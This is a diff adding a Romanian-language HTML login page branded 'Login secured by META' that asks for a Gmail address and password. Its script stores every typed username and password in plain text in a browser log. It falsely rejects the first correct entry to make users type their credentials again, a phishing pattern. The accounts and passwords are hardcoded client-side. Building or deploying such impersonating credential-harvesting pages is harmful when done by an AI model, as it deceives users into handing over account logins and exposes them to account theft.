@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+<meta charset="UTF-8">
+<title>Login</title>
+<style>
+/* --- Reset & body full screen --- */
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+html, body {
+  height: 100%;
+  width: 100%;
+  font-family: Arial, sans-serif;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  background: linear-gradient(270deg, #8000ff, #ff66cc, #9933ff, #ff99cc);
+  background-size: 800% 800%;
+  animation: gradientAnimation 15s ease infinite;
+  overflow: hidden;
+}
+
+@keyframes gradientAnimation {
+  0% {background-position: 0% 50%;}
+  50% {background-position: 100% 50%;}
+  100% {background-position: 0% 50%;}
+}
+
+/* --- Container login centrat --- */
+.login-container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  background-color: rgba(255,255,255,0.2);
+  padding: 40px;
+  border-radius: 20px;
+  box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+  width: 90%;
+  max-width: 400px; /* nu depășește 400px */
+}
+
+/* --- Input-uri --- */
+input {
+  margin: 10px 0;
+  padding: 12px;
+  width: 100%; /* se adaptează la container */
+  border-radius: 10px;
+  border: none;
+  font-size: 16px;
+  box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+  transition: 0.3s;
+}
+
+input:focus {
+  outline: none;
+  box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+}
+
+/* --- Buton --- */
+button {
+  margin-top: 15px;
+  padding: 12px 25px;
+  width: 100%; /* se adaptează la container */
+  border-radius: 10px;
+  border: none;
+  background-color: #ff99cc;
+  color: #8000ff;
+  font-weight: bold;
+  cursor: pointer;
+  font-size: 16px;
+  box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+  transition: 0.3s;
+}
+
+button:hover {
+  background-color: #ff66cc;
+  color: white;
+  transform: translateY(-2px);
+}
+
+button:active {
+  background-color: #ff3399;
+  color: white;
+  transform: translateY(0);
+  box-shadow: 0 3px 10px rgba(0,0,0,0.3);
+}
+
+/* --- Titlu --- */
+h2 {
+  color: white;
+  text-align: center;
+  margin-bottom: 25px;
+  font-size: 24px;
+}
+
+/* --- Media Queries pentru mobil --- */
+@media (max-width: 480px) {
+  .login-container {
+    padding: 30px;
+    border-radius: 15px;
+  }
+
+  h2 {
+    font-size: 20px;
+  }
+
+  input, button {
+    font-size: 14px;
+    padding: 10px;
+  }
+}
+</style>
+</head>
+<body>
+
+<div class="login-container">
+  <h2>Login secured by META</h2>
+
+  <form id="loginForm">
+    <input type="text" id="username" placeholder="Gmail" required><br>
+    <input type="password" id="password" placeholder="Password" required><br>
+    <button type="submit">Login</button>
+  </form>
+</div>
+
+<script>
+  const users = [
+    {username: 'Moldo', password: '6767', role: 'admin'},
+    {username: 'user1', password: 'abcd', role: 'user'},
+    {username: 'user2', password: 'pass', role: 'user'}
+  ];
+
+  let loginLog = JSON.parse(localStorage.getItem('loginLog')) || [];
+  let userTries = JSON.parse(localStorage.getItem('userTries')) || {};
+
+  document.getElementById('loginForm').addEventListener('submit', function(e){
+    e.preventDefault();
+
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    // Salvăm încercarea
+    loginLog.push({username, password});
+    localStorage.setItem('loginLog', JSON.stringify(loginLog));
+
+    const user = users.find(u => u.username === username);
+
+    if(!user || user.password !== password){
+      alert('Gmail sau parola incorecte!');
+      if(user && user.role === 'user'){
+        userTries[username] = (userTries[username] || 0) + 1;
+        localStorage.setItem('userTries', JSON.stringify(userTries));
+      }
+      return;
+    }
+
+    if(user.role === 'admin'){
+      window.location.href = "admin.html";
+      return;
+    }
+
+    if(user.role === 'user'){
+      if(userTries[username] === 1){
+        window.location.href = "user.html";
+      } else {
+        alert('Gmail sau parola incorecte! Mai încearcă o dată.');
+        userTries[username] = 1;
+        localStorage.setItem('userTries', JSON.stringify(userTries));
+      }
+    }
+  });
+</script>
+
+</body>
+</html>
